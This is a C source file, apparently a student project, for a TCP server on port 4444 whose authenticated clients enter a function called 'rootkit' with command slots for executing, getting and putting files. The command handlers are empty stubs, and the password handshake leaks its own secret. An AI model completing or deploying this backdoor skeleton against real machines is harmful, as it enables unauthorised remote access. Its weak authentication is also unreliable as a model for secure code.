#include <arpa/inet.h>
#include <math.h>
#include <pthread.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PORT 4444 

typedef struct Server {
    int server_fd;
    struct sockaddr_in addr;
    socklen_t addrlen;
} s_server;

enum {
    CMD_EXEC,
    CMD_GET,
    CMD_PUT,
    CMD_EXIT
};

typedef struct instruction {
    int command;
    char *instruction;
}s_instruction;

int find_size(int n)
{
    int size = 0;
    while (n / 10 > 0)
    {
        n /= 10;
        size++;
    }
    return size;
}

char *my_itoa(int value, char *s)
{
    if (value == 0)
    {
        s[0] = '0';
    }
    int i = 0;
    if (value < 0)
    {
        value *= -1;
        s[i] = '-';
        i++;
    }
    int size = find_size(value);
    size += i;
    s[size + 1] = '\0';
    while (value > 0)
    {
        s[size] = value % 10 + '0';
        value /= 10;
        size--;
    }
    return s;
}


void genere_password(char *pass, char *key)
{
    char parsed[12];
    int created = rand() % 162;
    my_itoa(created, parsed);
    strcat(pass, parsed);
    int manipulated = (created * 100 ) + 1;
    my_itoa(manipulated, key);
    return;
}

int handshake(int socket_client)
{
    char pass[32] = "base_pass";
    char key[16];
    genere_password(pass, key);
    send(socket_client, key, strlen(key), 0);
    char try[64] = {0};
    int r = recv(socket_client, try, sizeof(try) - 1, 0);
    if (r <= 0) {
        perror("recv");
        return -1;
    }

    try[r] = '\0';
    printf("Recu du client : %s\n", try);
    printf("Mot de passe attendu : %s\n", pass);

    if (strcmp(pass, try) == 0)
    {
        send(socket_client, "authenticated", strlen("authenticated"), 0);
        return 1;

    }
    send(socket_client, "perdu aller salut mdr", strlen("perdu aller salut mdr"), 0);
    return 0;
}

void rootkit(int socket)
{
    int command = -1;
    while(command != CMD_EXIT)
    {
        send(socket, "En attente d instruction", strlen("En attente d instruction"), 0);
        recv(socket, &command, sizeof(int), 0);
        switch (command)
        {
            case CMD_EXEC:
                break;
            case CMD_EXIT:
                send(socket, "Deconnection", strlen("Deconnection"), 0);
                break;
            case CMD_GET:
                break;
            case CMD_PUT:
                break;
        }
    }
}

void *manage_client(void *arg)
{
    int *client_fd;
    client_fd =  (int *) arg;
    if (handshake(*client_fd) == 1)
    {
        rootkit(*client_fd);
    }
    close(*client_fd);
    free(client_fd);
    return NULL;
}

void *client_connect(void *arg)
{
    s_server *server = (s_server *) arg; 
    if (listen(server->server_fd, 1) < 0) {
            perror("listen");
            close(server->server_fd);
            exit(EXIT_FAILURE);
        }
    while(1)
    {

        int *client_fd = malloc(sizeof(int));
        *client_fd = accept(server->server_fd, (struct sockaddr*)&server->addr, &server->addrlen);
        if (*client_fd < 0) {
            perror("accept");
            close(server->server_fd);
            exit(EXIT_FAILURE);
        }

        pthread_t client_thread;
        pthread_create(&client_thread, NULL, manage_client, client_fd);
        pthread_detach(client_thread);

    }

    return NULL;
}


int main() {
    char buffer[1024];                 // buffer pour stocker les données reçues
    struct sockaddr_in addr;          // structure pour l'adresse du serveur/client
    s_server *server = malloc(sizeof(s_server)); 
    server->server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server->server_fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    memset(&server->addr, 0, sizeof(server->addr));
    server->addr = addr;
    server->addr.sin_family = AF_INET;
    server->addr.sin_addr.s_addr = INADDR_ANY;
    server->addr.sin_port = htons(PORT);
    server->addrlen = sizeof(server->addr);

    if (bind(server->server_fd, (struct sockaddr*)&server->addr, server->addrlen) < 0) {
        perror("bind");
        close(server->server_fd);
        exit(EXIT_FAILURE);
    }

    // FILE *f = fopen("received_file", "wb");

    // int n;
    // // on lis les données reçues depuis la socket client, puis on écris dans le fichier
    // while ((n = read(client_fd, buffer, 1024)) > 0) {
    //     fwrite(buffer, 1, n, f);
    // }

    //fclose(f);
    pthread_t client_connector;
    pthread_create(&client_connector, NULL, client_connect, server);
    pthread_join(client_connector, NULL);
    close(server->server_fd);
    free(server);
    return 0;
}
